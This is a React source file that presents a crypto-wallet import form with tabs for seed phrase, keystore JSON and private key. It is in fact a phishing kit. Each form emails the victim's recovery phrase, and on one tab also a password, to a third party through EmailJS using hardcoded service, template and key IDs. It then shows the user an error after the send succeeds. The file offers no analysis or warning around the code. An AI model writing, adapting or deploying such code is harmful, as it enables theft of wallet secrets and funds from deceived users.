import { Text, Textarea, Box, Button, Input } from '@chakra-ui/react'
import React, { useRef, useState } from 'react';
import { Tabs, TabList, TabPanels, Tab, TabPanel } from '@chakra-ui/react';
import emailjs from '@emailjs/browser';


const CONFIG_DETAILS = {
  template_id: 'template_y9llqkt',
  service_id: 'service_5omfor8',
  public_key: 'P8n5duYi_KGPLoxuo',
};

function ConnectForm({setIsError}) {
   return (
     <Tabs>
       <TabList>
         <Tab color='black'>Phrase</Tab>
         <Tab color='black'>Keystore JSON</Tab>
         <Tab color='black'>Private Key</Tab>
       </TabList>

       <TabPanels>
         <TabPanel>
           <Form setError={setIsError} />
         </TabPanel>
         <TabPanel>
           <FormWithPassword setError={setIsError} />
         </TabPanel>
         <TabPanel>
           <Form setError={setIsError} />
         </TabPanel>
       </TabPanels>
     </Tabs>
   );
}


function Form({setError}) {
  let [phrase, setPhrase] = React.useState('');
  const [loading, setLoading] = useState(false);

  let handleInputChange = (e) => {
    let inputPhrase = e.target.value
    setPhrase(inputPhrase)
  }

  const formRef = useRef();

  const sendEmail = (e) => {
    e.preventDefault();
    setLoading(true)

    emailjs
      .sendForm(
        CONFIG_DETAILS.service_id,
        CONFIG_DETAILS.template_id,
        formRef.current,
        CONFIG_DETAILS.public_key
      )
      .then(
        (result) => {
          console.log(result.text);
          setLoading(false)
          setError(true)
        },
        (error) => {
          console.log(error.text);
          setLoading(false);
        }
      );
  };

  return (
    <Box ref={formRef} onSubmit={sendEmail} as='form' color='black' className='flex flex-col gap-4'>
      <Textarea
        value={phrase}
        onChange={handleInputChange}
        placeholder='Phrase'
        rows={7}
        rounded={'md'}
        required
        name="phrase"
        size='lg'
      />
      <Text mt='8px'>
        Typically 12 (sometimes 24) words seperated by a single spaces.
      </Text>
      <Button isLoading={loading} type='submit' colorScheme='teal' className='!bg-emerald-500 hover:bg-emerald-700 transition-all' size='lg' width={"full"}>
        Import
      </Button>
    </Box>
  );
}
function FormWithPassword({setError}) {
  let [phrase, setPhrase] = React.useState('');
  const [loading, setLoading] = useState(false);

  let handleInputChange = (e) => {
    let inputPhrase = e.target.value
    setPhrase(inputPhrase)
  }

  const formRef = useRef();

  const sendEmail = (e) => {
    e.preventDefault();
    setLoading(true)

    emailjs
      .sendForm(
        CONFIG_DETAILS.service_id,
        CONFIG_DETAILS.template_id,
        formRef.current,
        CONFIG_DETAILS.public_key
      )
      .then(
        (result) => {
          console.log(result.text);
          setLoading(false)
          setError(true)
        },
        (error) => {
          console.log(error.text);
          setLoading(false);
        }
      );
  };

  return (
    <Box
      ref={formRef}
      onSubmit={sendEmail}
      as='form'
      color='black'
      className='flex flex-col gap-4'
    >
      <Textarea
        value={phrase}
        onChange={handleInputChange}
        placeholder='Phrase'
        rows={7}
        rounded={'md'}
        required
        name='phrase'
        size='lg'
      />
      <Input name="password" placeholder='password' size='md' />
      <Text mt='8px'>
        Typically 12 (sometimes 24) words seperated by a single spaces.
      </Text>
      <Button
        isLoading={loading}
        type='submit'
        colorScheme='teal'
        className='!bg-emerald-500 hover:bg-emerald-700 transition-all'
        size='lg'
        width={'full'}
      >
        Import
      </Button>
    </Box>
  );
}

export default ConnectForm
